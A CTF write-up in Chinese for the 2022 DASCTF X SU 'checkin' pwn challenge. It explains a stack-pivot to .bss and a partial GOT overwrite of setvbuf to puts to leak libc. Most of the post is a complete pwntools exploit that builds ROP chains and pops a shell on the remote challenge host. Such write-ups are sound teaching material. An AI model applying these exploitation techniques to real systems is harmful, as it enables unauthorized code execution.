---
layout: post
title: 2022DASCTF X SU checkin
subheading:
author: dayfly
categories: pwn
banner:
  # video: https://vjs.zencdn.net/v/oceans.mp4
  loop: true
  volume: 0.8
  start_at: 8.5
  image: https://bit.ly/3xTmdUP
  opacity: 0.618
  background: "#000"
  height: "100vh"
  min_height: "38vh"
  heading_style: "font-size: 4.25em; font-weight: bold; text-decoration: underline"
  subheading_style: "color: gold"
tags: [pwn, stack pivoting]
sidebar: []
---

## 检查程序

程序语义很简单，buf数组最多有0x10的溢出，No canary，开了NX，没有任何的输出函数

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[160]; // [rsp+0h] [rbp-A0h] BYREF

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  read(0, buf, 0xB0uLL);
  return 0;
}
```

## 思路
因为能溢出的数据不多，自然先考虑控制rbp进行栈迁移到bss段，没有输出的函数的话，考虑将setvbuf的got地址覆盖为puts函数的地址，官方给出了对应的libc版本，是GLIBC 2.31-0ubuntu9.7，发现setvbuf和puts只有低12位不同，只需覆盖最低2个字节既可，爆破的概率是1/16。成功覆盖后打印read函数的got地址就能拿到libc地址，然后就是常规的拿shell了。
利用的关键点有两个：栈迁移到bss，覆盖setvbuf从而leak libc 

```python
from pwn import *
from sys import argv

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']

binary = './checkin'
elf = ELF('./checkin')
libc = ELF('./libc.so.6')

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(str(delim), data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(str(delim), data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims             :p.recvuntil(delims)
rl      = lambda                    :p.recvline()
rls     = lambda num=1              :p.recvlines(num)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

while True:
        try:
                p = process(binary)
                if argv[1] == 'r':
                        p = remote('node4.buuoj.cn', 25751)
                bss = 0x404500
                read_start = 0x4011BF
                rdi = 0x0401253
                rsir15 = 0x0401251
                rbp = 0x040113d
                leave = 0x4011E2
                rdxr12 = 0x119241

                setvbuf_got = elf.got['setvbuf']
                read = elf.symbols['read']
                fake_puts = elf.symbols['setvbuf']
                read_got = elf.got['read']
                log.success('setvbuf_got ' + hex(setvbuf_got))
                log.success('fake_puts ' + hex(fake_puts))
                log.success('read_got ' + hex(read_got))

                # read payload to bss
                pay = b'b'*0xA0+p64(bss+0xa0)+p64(read_start)
                s(pay)
                print(pay)

                # overwrite setvbuf_got to puts_got
                make_puts = p64(rdi)+p64(0)+p64(rsir15)+p64(setvbuf_got)+p64(0)+p64(read)
                # puts_got read_got
                leak_read = p64(rdi)+p64(read_got)+p64(fake_puts) +p64(rbp) + p64(bss+0xa0+0x100)+ p64(read_start)
                exp = make_puts 
                exp += leak_read
                print(hex(len(exp)))

                # stack pivoting to bss
                pay2 = exp.ljust(0xa0, b'b')+p64(bss-8)+p64(leave)
                s(pay2)
                print(pay2)

                sleep(0.2)
                # try to overwrite setvbuf_got[16:0]
                s(p16(0x4450))

                # leak libc
                libc_base = uu64(ru('\x7f')[-6:]) - libc.symbols['read']
                binsh = libc_base + next(libc.search(b'/bin/sh'))
                execve = libc_base + 0xE31A0
                pop_rdx_r12_ret = libc_base + rdxr12

                log.success('libc_base ' + hex(libc_base))
                log.success('binsh ' + hex(binsh))
                log.success('execve ' + hex(execve))

                sleep(1)

                # execve(rdi='binsh', rsi=0, rdx=0)
                exp2 = p64(rdi) + p64(binsh) + p64(rsir15) + p64(0)*2 + p64(pop_rdx_r12_ret) + p64(0)*2 + p64(execve)
                pay3 = exp2.ljust(0xa0, b'b')+p64(bss+0x100-8)+p64(leave)
                s(pay3)
                print(pay3)

                sl('cat flag')
                itr()

        except:
                p.close()
                pass
```
